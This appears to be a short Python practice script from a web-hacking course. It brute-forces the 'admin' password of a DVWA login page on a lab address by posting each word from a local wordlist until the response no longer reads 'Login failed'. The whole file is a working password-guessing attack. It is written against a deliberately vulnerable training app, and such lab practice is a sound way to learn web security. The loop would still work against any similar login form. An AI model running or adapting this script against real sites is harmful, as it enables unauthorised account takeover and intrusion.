# This script is used to test post method in requests
import requests, sys

target_url = "http://10.0.2.6/dvwa/login.php"
# data_dict = {"username":"Q", "password":"007", "Login":"submit"}# name, name, value
data_dict = {"username":"admin", "password":"", "Login":"submit"}

with open("/root/PythonHacking/WebApplicationHacking/passwords.txt") as wordlist_file:
    for line in wordlist_file:
        word = line.strip()
        data_dict["password"] =word
        response = requests.post(target_url, data=data_dict)
        if "Login failed" not in response.content.decode():
            print("[+] Find the password --> " + word)
            sys.exit()

print("[+] Reached end of line.")
